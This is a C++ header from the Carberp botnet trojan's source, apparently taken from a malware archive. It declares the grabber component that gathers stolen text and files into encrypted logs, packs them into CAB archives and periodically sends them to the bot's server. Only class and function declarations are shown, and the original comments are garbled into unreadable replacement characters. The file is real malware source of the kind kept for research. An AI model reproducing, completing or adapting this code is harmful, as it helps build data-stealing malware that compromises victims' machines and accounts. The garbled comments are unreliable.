/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//  ������ ������ ��� ������ ��������
//---------------------------------------------------------------------------

#ifndef GrabbersH
#define GrabbersH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"
#include "BotClasses.h"


// ��������� ����� �������
#define GRABBER_FILE_SIGNATURE 0x87AF1966

// ��������� ����� ������ ����� �������
#define GRABBER_FILE_BLOCK_SIGNATURE 0xC7BFB244

// ������ ����� �������
#define GRABBER_FILE_VERSION 1


// �������� �������� ��������
#define GRABBER_SEND_INTERVAL 300000 /* ���� ����� */

// ���� ������ ��������
#define GRABBER_DATA_TEXT     100  /* ��������� ���� */
#define GRABBER_DATA_TEXTPART 101  /* ����� ���������� ����� */
#define GRABBER_DATA_FILE     102  /* �������� ���� */


//-------------------------------------------
//  GetGrabbersPath - ������� ��������� ���
//                �������� �������� �������
//-------------------------------------------
string GetGrabbersPath();



class TGrabberFile;
class TGrabberBlock;



//------------------------------------------------------
//  TGrabberFile - ������� ����� ��� ������ � ������
//                 �������
//------------------------------------------------------
class TGrabberFile : public TBotObject
{
private:
	TBotCollection* FBlocks; // ��������� ������
	string FFileName;     // ��� �����
	string FGrabberName;  // ��� �������
	PCHAR  FPassword;     // ������ ����������
	DWORD  FType;         // ��� �����
	DWORD  FBlocksStart;  // �������� � ����� � ������ ������ ������
	bool   FClosed;       // ������� ����, ��� ��� �����
	DWORD  FSendInterval; // �������� ������� ����� �������� ����� ��������� ���
	bool   FSendAsCAB;    // ������� ������������� �������� ���� CAB ������
	DWORD  FPID;          // ������������� �������, ������� ������ ���
	bool   FIsEmpty;      // ������� ����, ��� ��� ������.  ��������� ������ ����� ������ ������
	TBotFileStream *FStream;

	void   Initialize(const string& GrabberName, const char* FileName, bool AutoActivate);
	bool   UpdateFileHeader(bool WriteName);
	bool   ReadBlocks();
	string DoPackTextData();
	bool   DoPackFilesToCab(LPVOID Cab);


	friend class TGrabberBlock;
protected:
	bool WriteData(LPVOID Data, DWORD Size, bool WriteSize, bool AllocMemForCrypt);
	bool WriteSizedString(const string &Str);

	bool ReadData(LPVOID Buf, DWORD DataSize);
	bool ReadString(DWORD StringSize, string &Str);
	bool ReadSizedString(string &Str);

	TGrabberBlock* GetBlockByName(const string& Name);
public:
	TGrabberFile(const string& GrabberName, const char* FileName, bool AutoActivate);
	TGrabberFile(const string& GrabberName);
	~TGrabberFile();
	bool Activate(bool* Created); // ������� ��������� ���� �������. ���� ��� ���, �� �� ����� ������������� ������
	bool Active();   // ������� ��������� ������ ���� � ������ ������ ��� ������
	bool Create();   // ������� ������ ����� ���� �������
	bool Open();     // ������� ��������� ������������ ���� �������
    bool CanSend(bool OpenFile); // ������� ���������� ������ ���� ���� ����� ���������

	void CloseLog();   // ������� ��������� ���.
	void CloseFile();  // ������� ��������� �������� ����
	void DeleteFile(); // ������� ��������� ���� � ������� ���

	string PackToCAB(); // ������� ������������ ������ � ��� �����

	void SetSendInterval(DWORD Interval); /* ����������� */  // ������� ����� �������� �������� ����� �������� ������ �� �������� ����
	void SetSendAsCAB(bool SendAsCAB); // ������� ����� ������������� �������� ���� CAB �������

	bool SendLog(bool DeleteLog); // ������� ���������� ��� � �������

	bool AddText(const string& Name, const string& Data); // ������� ��������� ��������� ������
	bool AddTextPart(HWND Wnd, const string& Name, const string& Data); // ������� ��������� ����� ��������� ������
	bool AddFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName); // ������� ��������� ���� � ���
};


//------------------------------------------------------
//  TGrabberBlock - ���� ������ �������
//------------------------------------------------------
class TGrabberBlock : public TBotCollectionItem
{
private:
	TGrabberFile* FFile;
	string FName;
	string FFileName;
	string FInternalFileName;
	string FTempFileName;
	DWORD  FDataSize;    // ������ ������ �����
	HWND   FWND;         // ������������� ����, ��� �������� ������� ��������� ���
	string FAsString;    // ��������� ������
	LPBYTE FAsBlob;      // ������ � �������� ����
	DWORD  FDataType;    // ��� ������ �����
	bool   FIgnoreBlock; // ������ ���� ���������� ���������������

	void Initialize();

	bool Write(LPVOID Data, DWORD DataSize, bool AllocMemForCrypt);

	bool Read();
	bool ReadBlockData();
	bool DoReadTextData();
	bool DoReadFileData();

	friend class TGrabberFile;
public:

	TGrabberBlock(TGrabberFile* File);
	~TGrabberBlock();

	void Clear();

	bool WriteText(const string& Name, const string& Data, bool IsTextPart);
	bool WriteFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName);
};



//------------------------------------------------------
//  ����� �������� �����
//------------------------------------------------------
class TGrabberFileSender : public TBotObject
{
private:
	string FWorkPath;
	string FMask;
public:
	TGrabberFileSender();
	~TGrabberFileSender();

	void SendFiles();
};

//---------------------------------------------------------------------------
#endif
